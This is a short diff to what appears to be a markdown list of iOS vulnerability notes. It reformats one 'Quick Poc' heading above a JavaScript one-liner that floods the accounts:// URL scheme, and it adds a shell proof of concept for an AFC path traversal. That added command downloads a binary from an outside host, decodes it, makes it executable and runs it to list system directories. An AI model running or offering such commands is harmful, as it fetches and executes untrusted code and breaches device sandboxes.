@@ -51,7 +51,7 @@ This vulnerability can be patched by improved memory management.
 
 This issue seems to be patched in iOS 12.
 
-Quick Poc: 
+_Quick Poc:_
 ```js
 setInterval(function(){window.location.href='accounts://'+'A'.repeat(10000);},0.1);
 ```
@@ -69,3 +69,10 @@ A local attacker may be able to list directories outside the sandbox.
 A path traversal vulnerability exists in the afc service.
 
 This issue can be resolved by improved path handling.
+
+_Quick Poc:_
+```sh
+curl http://exploitation.cool/exploits/afcclient.bin | base 64 -D > afcclient && \
+chmod +x afcclient && \
+afcclient ls ../../../../../../usr/libexec/ \
+```
